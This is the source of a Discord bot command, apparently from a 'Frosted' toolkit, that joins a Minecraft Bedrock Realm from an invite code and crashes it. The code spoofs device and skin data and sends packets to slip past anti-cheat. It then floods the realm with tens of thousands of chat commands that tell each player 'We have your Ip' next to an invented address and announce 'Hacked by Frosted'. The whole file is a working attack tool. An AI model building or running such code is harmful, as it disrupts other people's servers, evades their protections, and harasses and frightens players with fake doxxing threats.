const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs');
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { Authflow, Titles } = require("prismarine-auth");
const skinData = require('../../data/client/jenny.json')

const ipAddresses = [
    '209.174.101.87', '55.92.101.28', '224.67.224.238', '70.120.73.88', '92.81.151.96',
    '251.116.158.83', '217.80.15.108', '90.12.199.8', '156.7.83.71', '173.201.76.185',
    '143.160.19.168', '133.247.28.252', '42.232.206.193', '245.238.82.196', '241.216.39.238',
    '239.9.11.189', '169.149.45.61', '52.81.83.111', '75.51.153.212', '178.118.210.224'
];

const playerIPMap = {};

function assignIPToPlayer(playerName) {
    if (playerIPMap[playerName]) {
        return playerIPMap[playerName];
    }
    const availableIP = ipAddresses.find(ip => !Object.values(playerIPMap).includes(ip));
    if (availableIP) {
        playerIPMap[playerName] = availableIP;
        return availableIP;
    } else {
        console.log('No available IP addresses left!');
        return null;
    }
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName("iptroll")
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .setDescription("Crash a realm")
        .addStringOption(option =>
            option.setName('invite')
                .setDescription('Realm invite code')
                .setRequired(true)
                .setMinLength(11)
                .setMaxLength(15)),
    async execute(interaction) {
        const invite = interaction.options.getString('invite');
        let disconnected = false;

        try {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Frosted IP Troll (r)")
                        .setDescription(`Loading data, this may take a few seconds depending on the workload.`)
                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                        .setThumbnail(config.embeds.footerurl)
                        .setColor(config.embeds.color)
                ],ephemeral: true,
            });

            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}`)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `X Account Not Linked X`,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: { text: "e" },
                        },
                    ],
                });
                return;
            }

            const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
            if (whitelist.includes(invite)) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }

            const realm = await dumprealm(invite);
            if (!realm) {
                console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Invalid code: realm not found or account banned.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
            
            const crypto = require("node:crypto");
            const curve = "secp384r1";
            const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
            const bot = new Authflow(
                interaction.user.id, 
                path.resolve(`./data/client/frosted/${interaction.user.id}`), 
                {
                    flow: 'live',
                    authTitle: 'MinecraftNintendoSwitch',
                    deviceType: 'Nintendo',
                    doSisuAuth: true
                }
            );
            
            async function refreshOrRetrieveTokens() {
                try {
                    const xboxToken = await bot.getXboxToken();
                    await bot.getMinecraftBedrockToken(keypair);
                    console.log('Susesfull Refreshed Token:', xboxToken);
                    return xboxToken;
                } catch (error) {
                    console.error('Error while Refrshing', error);
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                }
            }
            
            (async () => {
                console.log('Refreshing Token...');
                
                const token = await refreshOrRetrieveTokens();
                if (token) {
                    console.log('Susessfull Refreshd Token');
                    
                } else {
                    console.log('Error Refreshing Token');
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                    return;
                }
            })();
            const client = createClient({
                profilesFolder: `./data/client/frosted/${interaction.user.id}`,
                username: interaction.user.id,
                offline: false,
                realms: {
                    ...(invite.length === 8
                        ? { realmId: invite }
                        : { realmInvite: invite })
                },
                skinData: {
                    DeviceOS: 12,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: genrandomstring(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: "§cdiscord.gg/frosted",
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                    ...skinData // costume skin for less detaction
                },
                skipPing: true
            });

            client.on('error', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client error: ${err.message || err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Error occurred: ${err.message || 'Unknown error'}`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
                client.disconnect();
            });

            client.on('player_list', (packet) => {
                const players = packet.records.records.map(player => player.username);
                players.forEach(player => {
                    const ip = assignIPToPlayer(player);
                    console.log(`[Debug]${player} assigned IP: ${ip}`);
                });
            });
            
            client.on('start_game', (packet) => { // Small littel Hack to make Bot less Detactebel
                runtimeEntityId = packet.runtime_entity_id
                console.log(`Runtime Entity ID: ${runtimeEntityId}`);
              });
              client.on('start_game', (packet) => {
              client.queue('serverbound_loading_screen', { // sends the "is loading in Packet"
                "type": 1
              })
              client.queue('serverbound_loading_screen', { // Removes the immortal status of the Bot
                "type": 2
              })
              client.queue('interact', {  // Verify the Movement so Server sees us as a Real Player !
                "action_id": "mouse_over_entity",
                "target_entity_id": 0n,
                "position": {
                  "x": 0,
                  "y": 0,
                  "z": 0
                }
              
              })
              client.queue('set_local_player_as_initialized', { // almost same as the first but mc is goofy and needs more packets, do i know ? nope !
                "runtime_entity_id": `${runtimeEntityId}`
              })
              client.queue("animate", {//  like a spoof to anti cheats :p
                  action_id: 1, // making your arm swing 
                  runtime_entity_id: packet.runtime_entity_id});
              })
  
            client.on('play_status', async () => {
                console.log(`${colors.green}[Realm Watcher]${colors.cyan}>> User ${interaction.user.username}/${interaction.user.id} join Realm ${realm.name}/${invite}`)
                try {
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('Frosted Crash (r)')
                                .setDescription(`Joined and started to crash ${realm.name} - ${invite}. Disconnecting in 10 seconds...`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });

                    setTimeout(() => {
                        if (disconnected) return;
                        const packetCount = 50000
                        let messageCount = 0;
                        const interval = setInterval(() => {
                            if (messageCount >= packetCount) {
                                clearInterval(interval);
                                return;
                            }
    
                    
                            for (let i = 0; i < 50000 && messageCount < packetCount; i++) {
                                for (let playerName in playerIPMap) {
                                    const ip = playerIPMap[playerName];
                                    client.write('command_request', {
                                        command: `/me @${playerName} §c§ We have your Ip: §2§ ${ip}`,
                                        origin: { type: 0, uuid: '5', request_id: 'TSL Nuker' },
                                        internal: false, version: 66
                                    });
                                    client.write('command_request', {
                                        command: `/me §6§ Hacked by §3 Frosted §2\n §2§ discord.gg/frosted`,
                                        origin: { type: 0, uuid: '5', request_id: 'TSL Nuker' },
                                        internal: false, version: 66
                                    });
                                    messageCount++;
                                }
                            }})
                        }, 1);

                    setTimeout(() => {
                        if (!disconnected) {
                            client.disconnect();
                            interaction.editReply({
                                embeds: [
                                    new EmbedBuilder()
                                        .setTitle('Frosted Crash (r)')
                                        .setDescription(`Client disconnected from ${realm.name}. Crash successful.`)
                                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                        .setThumbnail(config.embeds.footerurl)
                                        .setColor(config.embeds.color)
                                ]
                            });
                            disconnected = true;
                        }
                    }, 10000);
                } catch (error) {
                    console.error(error);
                    throw error;
                }
            });

            client.on('close', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client closed: ${err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Connection closed. Crash completed.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            });
        } catch (err) {
            console.error(err);
        }
    }
};

function genrandomstring(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}
